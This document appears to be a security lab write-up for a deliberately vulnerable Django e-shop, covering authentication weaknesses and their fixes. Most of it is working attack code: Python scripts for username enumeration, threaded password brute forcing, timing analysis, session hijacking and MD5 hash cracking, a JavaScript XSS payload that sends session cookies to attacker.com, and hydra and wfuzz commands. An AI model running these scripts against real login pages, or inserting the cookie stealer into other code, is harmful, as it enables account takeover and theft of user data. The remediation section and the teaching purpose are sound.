# Authentication Weaknesses Documentation

## Vulnerability Overview
**Type**: Multiple Authentication Vulnerabilities  
**Severity**: Critical  
**OWASP Category**: A07:2021 – Identification and Authentication Failures  

## Vulnerability Details

### 1. User Enumeration
**Location**: `eshop/forms.py` - LoginForm clean() method (lines 154-172)  
**Issue**: Different error messages reveal if username exists  

### 2. No Rate Limiting
**Location**: `eshop_project/settings.py` - Disabled middleware (lines 137-139)  
**Issue**: No protection against brute force attacks  

### 3. Weak Password Hashing
**Location**: `eshop_project/settings.py` - PASSWORD_HASHERS (line 297)  
**Issue**: Using MD5 instead of Argon2  

### 4. No CAPTCHA Protection
**Location**: `eshop/forms.py` - LoginForm (lines 101-106)  
**Issue**: CAPTCHA field commented out  

### 5. Insecure Session Management
**Location**: `eshop_project/settings.py` - Session settings (lines 367-376)  
**Issues**:
- SESSION_COOKIE_HTTPONLY = False (JavaScript can access)
- SESSION_COOKIE_SECURE = False (sent over HTTP)
- SESSION_COOKIE_SAMESITE disabled

## Exploitation Steps

### 1. User Enumeration Attack

**Manual Test**:
```bash
# Valid username
curl -X POST http://localhost:8000/login/ \
  -d "username=admin&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded"
# Response: "Invalid password for user 'admin'"

# Invalid username  
curl -X POST http://localhost:8000/login/ \
  -d "username=doesnotexist&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded"
# Response: "Username 'doesnotexist' does not exist in our system"
```

**Automated Username Enumeration Script**:
```python
import requests
import time

def enumerate_users(wordlist_file):
    """Enumerate valid usernames based on error messages"""
    valid_users = []
    
    with open(wordlist_file, 'r') as f:
        usernames = f.read().splitlines()
    
    for username in usernames:
        data = {
            'username': username,
            'password': 'test123'
        }
        
        response = requests.post('http://localhost:8000/login/', data=data)
        
        if "does not exist" not in response.text:
            print(f"[+] Valid username found: {username}")
            valid_users.append(username)
        else:
            print(f"[-] Invalid username: {username}")
            
        # No rate limiting, but be nice to the server
        time.sleep(0.1)
    
    return valid_users

# Usage
valid_users = enumerate_users('usernames.txt')
```

### 2. Brute Force Attack (No Rate Limiting)

**Password Brute Force Script**:
```python
import requests
import concurrent.futures

def try_password(username, password):
    """Try a single password"""
    data = {
        'username': username,
        'password': password
    }
    
    response = requests.post('http://localhost:8000/login/', data=data)
    
    if "Invalid password" not in response.text and "does not exist" not in response.text:
        return password
    return None

def brute_force_password(username, wordlist_file, threads=50):
    """Brute force password with multiple threads"""
    with open(wordlist_file, 'r') as f:
        passwords = f.read().splitlines()
    
    print(f"[*] Brute forcing password for user: {username}")
    print(f"[*] Using {threads} threads")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for password in passwords:
            future = executor.submit(try_password, username, password)
            futures.append((future, password))
        
        for future, password in futures:
            result = future.result()
            if result:
                print(f"[+] Password found: {result}")
                return result
                
    print("[-] Password not found")
    return None

# Usage
password = brute_force_password('admin', 'passwords.txt', threads=100)
```

### 3. Timing Attack Analysis

**Timing Attack Script**:
```python
import requests
import time
import statistics

def measure_response_time(username, password, iterations=10):
    """Measure average response time for login attempt"""
    times = []
    
    for _ in range(iterations):
        start = time.time()
        
        data = {
            'username': username,
            'password': password
        }
        
        requests.post('http://localhost:8000/login/', data=data)
        
        end = time.time()
        times.append(end - start)
    
    return statistics.mean(times), statistics.stdev(times)

def timing_attack_analysis():
    """Analyze timing differences to detect valid usernames"""
    test_users = ['admin', 'user1', 'doesnotexist1', 'doesnotexist2']
    
    results = {}
    for username in test_users:
        avg_time, std_dev = measure_response_time(username, 'wrongpass')
        results[username] = (avg_time, std_dev)
        print(f"{username}: {avg_time:.4f}s (±{std_dev:.4f}s)")
    
    # Valid users typically have longer response times
    # due to password checking
    return results
```

### 4. Session Hijacking (Insecure Cookies)

**JavaScript Session Stealer** (inject via XSS):
```javascript
// Since SESSION_COOKIE_HTTPONLY = False, we can access the session cookie
var sessionCookie = document.cookie.match(/sessionid=([^;]+)/)[1];

// Send to attacker
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        session: sessionCookie,
        url: window.location.href,
        user_agent: navigator.userAgent
    })
});
```

**Session Hijacking Script**:
```python
import requests

def hijack_session(stolen_session_id):
    """Use stolen session ID to impersonate user"""
    
    # Create session with stolen cookie
    session = requests.Session()
    session.cookies.set('sessionid', stolen_session_id)
    
    # Access protected resources
    response = session.get('http://localhost:8000/profile/')
    
    if response.status_code == 200:
        print("[+] Session hijack successful!")
        print(f"[+] User data: {response.text[:200]}...")
    else:
        print("[-] Session hijack failed")
```

### 5. Password Hash Cracking (MD5)

**MD5 Hash Cracking**:
```python
import hashlib
import concurrent.futures

def crack_md5_hash(hash_to_crack, wordlist):
    """Crack MD5 password hash"""
    
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        md5_hash = hashlib.md5(password.encode()).hexdigest()
        
        if md5_hash == hash_to_crack:
            return password
    
    return None

# Example with Django MD5 hash format
def crack_django_md5(django_hash, wordlist):
    """Crack Django MD5 hash (format: md5$salt$hash)"""
    
    parts = django_hash.split('$')
    if len(parts) != 3 or parts[0] != 'md5':
        return None
        
    salt = parts[1]
    target_hash = parts[2]
    
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            # Django MD5 format: md5(salt + password)
            salted = salt + password
            hash_attempt = hashlib.md5(salted.encode()).hexdigest()
            
            if hash_attempt == target_hash:
                return password
    
    return None
```

## Impact Analysis

### Business Impact
- Complete account takeover
- Customer data theft
- Financial fraud
- Reputation damage
- Regulatory penalties (GDPR)

### Technical Impact
- User impersonation
- Session hijacking
- Database compromise
- System access escalation

## Attack Scenarios

### Scenario 1: Automated Account Takeover
1. Enumerate valid usernames
2. Brute force passwords (no rate limiting)
3. Crack stolen MD5 hashes
4. Mass account compromise

### Scenario 2: Targeted Attack
1. Identify admin username via enumeration
2. Launch focused brute force attack
3. Gain admin access
4. Exfiltrate all data

### Scenario 3: Session-Based Attack
1. Exploit XSS to steal session cookies
2. Hijack active sessions
3. Perform actions as logged-in users
4. Cover tracks by deleting logs

## Remediation

### Immediate Fixes

1. **Fix User Enumeration**:
```python
# Generic error message
raise ValidationError("Invalid username or password")
```

2. **Enable Rate Limiting**:
```python
MIDDLEWARE = [
    'axes.middleware.AxesMiddleware',
    'django_ratelimit.middleware.RatelimitMiddleware',
]
```

3. **Use Strong Password Hashing**:
```python
PASSWORD_HASHERS = [
    'django.contrib.auth.hashers.Argon2PasswordHasher',
]
```

4. **Secure Session Cookies**:
```python
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = 'Lax'
```

5. **Add CAPTCHA**:
```python
captcha = CaptchaField()
```

### Additional Security Measures
1. Implement account lockout after failed attempts
2. Add two-factor authentication (2FA)
3. Monitor for suspicious login patterns
4. Implement login anomaly detection
5. Regular security audits

## Testing Tools

### Automated Testing
```bash
# Hydra for brute force
hydra -l admin -P passwords.txt localhost http-post-form "/login/:username=^USER^&password=^PASS^:Invalid"

# Burp Suite Intruder
# Configure for username enumeration and password spraying

# wfuzz for fuzzing
wfuzz -c -z file,users.txt -z file,passwords.txt --hc 404 http://localhost:8000/login/ -d "username=FUZZ&password=FUZ2Z"
```

## References
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [CWE-203: Information Exposure Through Discrepancy](https://cwe.mitre.org/data/definitions/203.html)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [CWE-916: Use of Password Hash With Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html)